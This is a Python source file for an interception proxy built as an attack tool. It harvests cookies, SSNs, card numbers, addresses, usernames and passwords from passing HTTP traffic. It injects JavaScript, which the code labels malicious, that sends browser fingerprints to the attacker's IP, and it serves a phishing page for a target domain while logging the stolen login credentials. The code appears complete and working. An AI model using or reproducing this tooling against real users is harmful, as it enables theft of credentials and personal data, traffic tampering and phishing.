import os
import socket
import sys
import threading
from urllib.parse import unquote
import re

def parse_input_args(args): # parse input arguments
    try:
        mode = args[1]
        if "-m" in args:
            i = args.index("-m")
            if not (i + 1 >= len(args)):
                mode = args[i+1]
        listening_ip = args[2]
        listening_port = args[3]
        domain = None
        if mode == "active":
            domain = args[4]
        return mode, listening_ip, listening_port, domain
    except Exception as e:
        print("Missing or invalid input parameters: ", e)
        exit(1)

def log2file(iterable, statement, file):
    file.write(statement)
    for item in iterable:
        output_string = item + '\n'
        file.write(output_string)

def passive_analysis(message, headers):
    with open("info_1.txt", "a") as file:
        #Extracting cookies from 'Cookie' header
        cookies = headers.get("Cookie", 0)
        if cookies:
            cookies = cookies.split("; ")
            log2file(cookies, "\nCookies sent in request:\n", file)
        #Exctracting cookies from 'Set-Cookie' header
        cookies = headers.get("Set-Cookie", 0)
        if cookies:
            log2file(cookies, "\nCookies set by server in response:\n", file)
        message = unquote(str(message.decode()))
        #Extracting potential SSNs
        ssns = re.findall("(?!219-09-9999|078-05-1120)(?!666|000|9\\d{2})\\d{3}-(?!00)\\d{2}-(?!0{4})\\d{4}", message)
        ssns += re.findall("(?!219099999|078051120)(?!666|000|9\\d{2})\\d{3}(?!00)\\d{2}(?!0{4})\\d{4}", message)
        if ssns:
            log2file(ssns, "\nPossible SSNs:\n", file)
        #Extracting potential credit/debit cards
        cc = re.findall("3[47][0-9]{13}", message)
        cc += re.findall("(6541|6556)[0-9]{12}", message)
        cc += re.findall("389[0-9]{11}", message)
        cc += re.findall("3(?:0[0-5]|[68][0-9])[0-9]{11}", message)
        cc += re.findall("(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}", message)
        cc += re.findall("(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}", message)
        cc += re.findall("(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}", message)
        cc += re.findall("(62[0-9]{14,17})", message)
        cc += re.findall("4[0-9]{12}(?:[0-9]{3})?", message)
        cc += re.findall("(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})", message)
        if cc:
            log2file(cc, "\nPossible credit/debit cards:\n", file)
        #Extracting common names
        names = re.findall("\\bjohn|michael|liam|olivia|noah|emma|oliver|ava|elijah|charlotte|william|sophia|james|amelia|benjamin|isabella|lucas|mia|henry|evelyn|alexander|harper", message, re.IGNORECASE)
        if names:
            log2file(names, "\nNames:\n", file)
        # Extracting US phone numbers
        phonenos = re.findall("[\d]{3}-[\d]{3}-[\d]{4}|[\d]{3}[\d]{3}[\d]{4}", message)
        if phonenos:
            log2file(phonenos, "\nPossible US phone-numbers:\n", file)
        # Extracting US addresses
        addresses = re.findall("\\b\\d{1,6}\\++.{2,25}\\b(?:avenue|ave|court|ct|street|st|drive|dr|lane|ln|road|rd|blvd|boulevard|plaza|parkway|pkwy)(?:[.,\\+]*)\\b(?:apt.|floor|suite|apartment)?(?:[\\+]?\\d{0,11})?", message, re.IGNORECASE)
        addresses += re.findall("\\b(?:state|zip|city|town|zipcode)=(?:[a-zA-Z()1-9]*)", message, re.IGNORECASE)
        if addresses:
            log2file(addresses, "\nPossible US addresses:\n", file)
        # Extracting usernames/emails
        users = re.findall("\\b(?:username|user|uname|usrn|uid|email|mail)=(?:[a-zA-Z_\\-\\?'!|\\\£$%/()=^§\"*+#€1-9]*)(?:@[a-zA-Z_\\-\\?'\"!|\\\£$%/()=^§*+#€1-9]*\\.\\w*)?", message, re.IGNORECASE)
        if users:
            log2file(users, "\nPotential usernames:\n", file)
        # Extracting passwords
        passwords = re.findall("\\b(?:password|pwd|pass|pword|pwrd)=(?:[a-zA-Z_\\-\\?'!|\\\£$%/()=^§\"*+#@€1-9]*)", message, re.IGNORECASE)
        if passwords:
            log2file(passwords, "\nPotential passwords\n", file)

def phishing(ip):
    with open("phishing_page.html", "r") as file:
        response = file.read()
        response = "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n" + response
        idx = response.find("<form action=")
        first_part = response[:idx+14]
        second_part = response[idx+14:]
        first_part = first_part + "http://" + ip + "/"
        response = first_part + second_part
        response = response.encode()
        print("Proxy: ", response)
    return response

def web_server(ip):
    proxyWebSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxyWebSocket.bind((ip, 80)) # start a web server
    proxyWebSocket.listen(5)
    while True:
        clientConnection, clientAddress = proxyWebSocket.accept()
        request, clientHeader = receive_response(clientConnection)
        print("Web server: ", request)
        try:
            request = request.decode()
            if "GET" in request[:4]: # GET request from the injected javascript
                if request.find("user-agent=") != -1 and request.find("screen=") != -1 and request.find("lang=") != -1:
                    request = unquote(request).splitlines()[0].split("&")
                    request[0] = request[0][request[0].find("user-agent="):]
                    request[2] = request[2][:request[2].find("HTTP")]
                    with open("info_2.txt", "a") as file:
                        for field in request:
                            output = field + "\n"
                            file.write(output)
            elif "POST" in request[:4]: # login POST request from phishing page
                idx = request.find("username")
                credentials = request[idx:]
                print("Credentials stolen from phishing page: ", unquote(credentials))
            response = "HTTP/1.1 200 OK\r\n\r\n".encode()
            print("Web server: ", response)
            clientConnection.sendall(response)
            clientConnection.close()
        except Exception as e:
            print("Something went wrong while extracting information from request: ", e)

def inject_javascript(response, ip):
    try:
        # malicious javascript
        javascript = "\n<script>useragent = window.navigator.userAgent;lang = window.navigator.language;resolution = String(window.screen.availHeight) + \"x\" + String(window.screen.availWidth);console.log(\"got params\");query_string = \"user-agent=\" + useragent + \"&screen=\" + resolution + \"&lang=\" + lang;var xmlHttp = new XMLHttpRequest();xmlHttp.open(\"GET\", \"http://{}/?\" + query_string, true);xmlHttp.send();</script>\n".format(ip)
        response = response.decode()
        head_idx = response.find("<head>")
        # inject javascript only if response has some html
        if head_idx != -1:
            first_part = response[:response.find("<head>")+6]
            second_part = response[response.find("<head>")+6:]
            first_part += javascript # inject javascript into <head> tag in html response
            response = first_part + second_part
            # if 'Content-Length' header was set in the response it gets deleted; the response is still valid
            idx = response.find("Content-Length:")
            if idx != -1:
                first_part = response[:idx]
                second_part = response[idx+16:]
                idx = second_part.find("\r\n")
                second_part = second_part[idx+2:]
                response = first_part + second_part
            idx = response.find("Access-Control-Allow-Origin:") # removing 'Access-Control-Allow-Origin:' header
            if idx != -1:
                first_part = response[:idx]
                second_part = response[idx + 16:]
                idx = second_part.find("\r\n")
                second_part = second_part[idx + 2:]
                response = first_part + second_part
            idx = response.find("\r\n")
            first_part = response[:idx+2]
            second_part = response[idx+2:]
            # inject new "Access-Control-Allow-Origin" header in order to perform the GET request to our own ip
            second_part = "Access-Control-Allow-Origin: *\r\n" + second_part
            response = first_part + second_part
        response = response.encode()
    except Exception as e:
        print("Something went wrong, unable to inject javascript in this response: ", e)
    return response

# remove "Accept-Encoding" header from requests in order to avoid dealing with different type of encoding/compression like gzip
# i.e. let's keep it simple
def tamper_encoding_header(request):
    try:
        request = request.decode()
        idx = request.find("Accept-Encoding:")
        if idx != -1:
            first_part = request[:idx]
            second_part = request[idx + 16:]
            idx = second_part.find("\r\n")
            second_part = second_part[idx + 2:]
            request = first_part + second_part
        request = request.encode()
        return request
    except Exception as e:
        print("Something went wrong while tampering with headers: ", e)

# parsing HTTP headers
def parse_headers(response):
    header = response[:-4].decode()
    header_dict = dict()
    set_cookie = list()
    for i in header.splitlines()[1:]:
        i = i.split(': ')
        if i[0] == "Set-Cookie":
            cookie = i[1].split(";")
            set_cookie.append(cookie[0])
        else:
            header_dict[i[0]] = i[1]
    if set_cookie:
        header_dict['Set-Cookie'] = set_cookie
    return header_dict

# receive HTTP response
def receive_response(socket):
    try:
        response = b''
        while b'\r\n\r\n' not in response: # reads the HTTP response header
            response += socket.recv(1)
            if not response:
                break
        headers = parse_headers(response)
    except Exception as e:
        print("Error while reading/parsing HTTP response header: ", e)
    content_length = int(headers.get("Content-Length", 0))
    if content_length: # if "Content-Length" header is found then read the number of bytes specified by the header
        response += socket.recv(content_length)
    else: # if "Content-Length" header is not found just keep reading until timeout happens
        socket.settimeout(0.6)
        try:
            while True:
                buffer = socket.recv(1024)
                if not buffer:
                    break
                response += buffer
        except:
            pass
    return response, headers

def main():
    if os.getuid() != 0:
        print("I need root privileges to run")
        exit(1)

    mode, listening_ip, listening_port, domain = parse_input_args(sys.argv[1:])

    web_server_thread = threading.Thread(target=web_server, args=(listening_ip,))
    web_server_thread.start() # starts the web server thread

    proxyServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxyServerSocket.bind((listening_ip, int(listening_port)))
    proxyServerSocket.listen(5) # opens socket
    while True:
        try:
            clientConnection, clientAddress = proxyServerSocket.accept()
            request, clientHeader = receive_response(clientConnection)
            host = clientHeader.get('Host', 0) # extracts 'Host' header from HTTP request
            request = tamper_encoding_header(request) # tampers request headers
            print("Proxy:", request)
            if mode == "passive":
                passive_analysis(request, clientHeader)
            if host:
                if domain and domain in host:
                    clientConnection.sendall(phishing(listening_ip)) # phishing page delivery
                else:
                    try:
                        proxyClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        proxyClientSocket.connect((host, 80)) # connects to the required web server
                        proxyClientSocket.sendall(request) # send client request to real server

                        response, serverHeader = receive_response(proxyClientSocket)
                        if mode == "passive":
                            passive_analysis(response, serverHeader)
                        if mode == "active":
                            response = inject_javascript(response, listening_ip)

                        print("Proxy: ", response)
                        clientConnection.sendall(response) # returns server response to client
                        proxyClientSocket.close()
                    except Exception as e:
                        print("Unable to connect to ", host, ": ", e)
                        clientConnection.close()
            clientConnection.close()
        except Exception as e:
            print("Unable to open a connection: ", e)

if __name__ == "__main__":
    main()